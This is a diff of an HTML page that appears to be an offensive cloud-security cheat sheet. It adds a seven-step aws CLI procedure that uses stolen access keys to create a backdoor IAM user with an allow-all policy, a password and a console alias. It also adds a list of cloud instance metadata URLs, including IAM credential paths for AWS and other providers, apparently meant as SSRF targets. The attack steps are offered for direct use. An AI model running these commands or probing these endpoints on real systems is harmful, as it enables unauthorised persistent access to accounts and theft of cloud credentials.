@@ -164,44 +164,139 @@
 <h3 id="gaining-access-to-aws-web-console-via-stolen-access-keys-awscli-in-7-steps">Gaining Access to AWS Web Console via stolen access keys &amp; awscli in 7 steps</h3>
 
 <p>Step 1) Create a temp user</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-aws iam create-user --user-name haxuser```" data-lang="aws iam create-user --user-name haxuser```">Step 2) Create access key for new temp user (can skip this step but its a cool backdoor)
 
-<p><code>aws iam create-user --user-name haxuser</code></p>
+```aws iam create-access-key --user-name haxuser```
 
-<p>Step 2) Create access key for new temp user (can skip this step but its a cool backdoor)</p>
+Step 3) Create a new temp group for new temp user
 
-<p><code>aws iam create-access-key --user-name haxuser</code></p>
+```aws iam create-group --group-name haxuser```
 
-<p>Step 3) Create a new temp group for new temp user</p>
+Step 4) Assign group policy for temp group granting all access
 
-<p><code>aws iam create-group --group-name haxuser</code></p>
+```aws iam put-group-policy --group-name haxuser --policy-name haxuser --policy-document &#39;{&#34;Version&#34;:&#34;2012-10-17&#34;, &#34;Statement&#34;: [{&#34;Sid&#34;: &#34;Stmt1437414476731&#34;, &#34;Action&#34;: &#34;*&#34;, &#34;Effect&#34;: &#34;Allow&#34;, &#34;Resource&#34;: &#34;*&#34; }]}&#39;```
 
-<p>Step 4) Assign group policy for temp group granting all access</p>
+Step 5) Add temp user to temp group
 
-<p><code>aws iam put-group-policy --group-name haxuser --policy-name haxuser --policy-document '{&quot;Version&quot;:&quot;2012-10-17&quot;, &quot;Statement&quot;: [{&quot;Sid&quot;: &quot;Stmt1437414476731&quot;, &quot;Action&quot;: &quot;*&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Resource&quot;: &quot;*&quot; }]}'</code></p>
+```aws iam add-user-to-group --group-name haxuser --user-name haxuser```
 
-<p>Step 5) Add temp user to temp group</p>
+Step 6) Create a login profile for temp user with a SUPER COOL password
 
-<p><code>aws iam add-user-to-group --group-name haxuser --user-name haxuser</code></p>
+```aws iam create-login-profile --user-name haxuser --password &#39;SuperDuperCoolPassword&#39;```
 
-<p>Step 6) Create a login profile for temp user with a SUPER COOL password</p>
+Step 7) Create an account alias so you can access the account web console
 
-<p><code>aws iam create-login-profile --user-name haxuser --password 'SuperDuperCoolPassword'</code></p>
+```aws iam create-account-alias --account-alias haxuseralias```
 
-<p>Step 7) Create an account alias so you can access the account web console</p>
+Now you can login directly using the new alias! Browse: hxxps://haxuseralias.signin.aws.amazon.com/console/
 
-<p><code>aws iam create-account-alias --account-alias haxuseralias</code></p>
+Profit!
 
-<p>Now you can login directly using the new alias! Browse: hxxps://haxuseralias.signin.aws.amazon.com/console/</p>
+### Links
 
-<p>Profit!</p>
+- [AWS IAM Privilege Escalation - Methods and Mitigation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
 
-<h3 id="links">Links</h3>
+- [flAWS2](http://flaws2.cloud)
 
-<ul>
-<li><p><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation - Methods and Mitigation</a></p></li>
+### Cloud Metadata</code></pre></div>
+<h2 id="aws">AWS</h2>
 
-<li><p><a href="http://flaws2.cloud">flAWS2</a></p></li>
-</ul>
+<h1 id="from-http-docs-aws-amazon-com-awsec2-latest-userguide-ec2-instance-metadata-html-instancedata-data-categories">from <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories">http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories</a></h1>
+
+<p><a href="http://169.254.169.254/latest/user-data">http://169.254.169.254/latest/user-data</a>
+<a href="http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE">http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE</a> NAME]
+<a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE">http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE</a> NAME]
+<a href="http://169.254.169.254/latest/meta-data/ami-id">http://169.254.169.254/latest/meta-data/ami-id</a>
+<a href="http://169.254.169.254/latest/meta-data/reservation-id">http://169.254.169.254/latest/meta-data/reservation-id</a>
+<a href="http://169.254.169.254/latest/meta-data/hostname">http://169.254.169.254/latest/meta-data/hostname</a>
+<a href="http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key">http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key</a>
+<a href="http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key">http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key</a></p>
+
+<h1 id="aws-dirs">AWS - Dirs</h1>
+
+<p><a href="http://169.254.169.254/">http://169.254.169.254/</a>
+<a href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a>
+<a href="http://169.254.169.254/latest/meta-data/public-keys/">http://169.254.169.254/latest/meta-data/public-keys/</a></p>
+
+<h2 id="google-cloud">Google Cloud</h2>
+
+<h1 id="https-cloud-google-com-compute-docs-metadata"><a href="https://cloud.google.com/compute/docs/metadata">https://cloud.google.com/compute/docs/metadata</a></h1>
+
+<h1 id="requires-the-header-metadata-flavor-google-or-x-google-metadata-request-true">- Requires the header &ldquo;Metadata-Flavor: Google&rdquo; or &ldquo;X-Google-Metadata-Request: True&rdquo;</h1>
+
+<p><a href="http://169.254.169.254/computeMetadata/v1/">http://169.254.169.254/computeMetadata/v1/</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/">http://metadata.google.internal/computeMetadata/v1/</a>
+<a href="http://metadata/computeMetadata/v1/">http://metadata/computeMetadata/v1/</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/instance/hostname">http://metadata.google.internal/computeMetadata/v1/instance/hostname</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/instance/id">http://metadata.google.internal/computeMetadata/v1/instance/id</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/project/project-id">http://metadata.google.internal/computeMetadata/v1/project/project-id</a></p>
+
+<h1 id="google-allows-recursive-pulls">Google allows recursive pulls</h1>
+
+<p><a href="http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true">http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true</a></p>
+
+<h2 id="google">Google</h2>
+
+<h1 id="beta-does-not-require-a-header-atm-thanks-mathias-karlsson-avlidienbrunn">Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)</h1>
+
+<p><a href="http://metadata.google.internal/computeMetadata/v1beta1/">http://metadata.google.internal/computeMetadata/v1beta1/</a></p>
+
+<h2 id="digital-ocean">Digital Ocean</h2>
+
+<h1 id="https-developers-digitalocean-com-documentation-metadata"><a href="https://developers.digitalocean.com/documentation/metadata/">https://developers.digitalocean.com/documentation/metadata/</a></h1>
+
+<p><a href="http://169.254.169.254/metadata/v1.json">http://169.254.169.254/metadata/v1.json</a>
+<a href="http://169.254.169.254/metadata/v1/">http://169.254.169.254/metadata/v1/</a>
+<a href="http://169.254.169.254/metadata/v1/id">http://169.254.169.254/metadata/v1/id</a>
+<a href="http://169.254.169.254/metadata/v1/user-data">http://169.254.169.254/metadata/v1/user-data</a>
+<a href="http://169.254.169.254/metadata/v1/hostname">http://169.254.169.254/metadata/v1/hostname</a>
+<a href="http://169.254.169.254/metadata/v1/region">http://169.254.169.254/metadata/v1/region</a>
+<a href="http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address">http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address</a></p>
+
+<h2 id="packetcloud">Packetcloud</h2>
+
+<p><a href="https://metadata.packet.net/userdata">https://metadata.packet.net/userdata</a></p>
+
+<h2 id="azure">Azure</h2>
+
+<h1 id="limited-maybe-more-exist">Limited, maybe more exist?</h1>
+
+<h1 id="https-azure-microsoft-com-en-us-blog-what-just-happened-to-my-vm-in-vm-metadata-service"><a href="https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/">https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/</a></h1>
+
+<p><a href="http://169.254.169.254/metadata/v1/maintenance">http://169.254.169.254/metadata/v1/maintenance</a></p>
+
+<h2 id="update-apr-2017-azure-has-more-support-requires-the-header-metadata-true">Update Apr 2017, Azure has more support; requires the header &ldquo;Metadata: true&rdquo;</h2>
+
+<h1 id="https-docs-microsoft-com-en-us-azure-virtual-machines-windows-instance-metadata-service"><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service">https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</a></h1>
+
+<p><a href="http://169.254.169.254/metadata/instance?api-version=2017-04-02">http://169.254.169.254/metadata/instance?api-version=2017-04-02</a>
+<a href="http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text">http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text</a></p>
+
+<h2 id="openstack-rackspace">OpenStack/RackSpace</h2>
+
+<h1 id="header-required-unknown">(header required? unknown)</h1>
+
+<p><a href="http://169.254.169.254/openstack">http://169.254.169.254/openstack</a></p>
+
+<h2 id="hp-helion">HP Helion</h2>
+
+<h1 id="header-required-unknown-1">(header required? unknown)</h1>
+
+<p><a href="http://169.254.169.254/2009-04-04/meta-data/">http://169.254.169.254/2009-04-04/meta-data/</a></p>
+
+<h2 id="oracle-cloud">Oracle Cloud</h2>
+
+<p><a href="http://192.0.0.192/latest/">http://192.0.0.192/latest/</a>
+<a href="http://192.0.0.192/latest/user-data/">http://192.0.0.192/latest/user-data/</a>
+<a href="http://192.0.0.192/latest/meta-data/">http://192.0.0.192/latest/meta-data/</a>
+<a href="http://192.0.0.192/latest/attributes/">http://192.0.0.192/latest/attributes/</a></p>
+
+<h2 id="alibaba">Alibaba</h2>
+
+<p><a href="http://100.100.100.200/latest/meta-data/">http://100.100.100.200/latest/meta-data/</a>
+<a href="http://100.100.100.200/latest/meta-data/instance-id">http://100.100.100.200/latest/meta-data/instance-id</a>
+<a href="http://100.100.100.200/latest/meta-data/image-id">http://100.100.100.200/latest/meta-data/image-id</a>
+```</p>
 
   </article>
 </section>
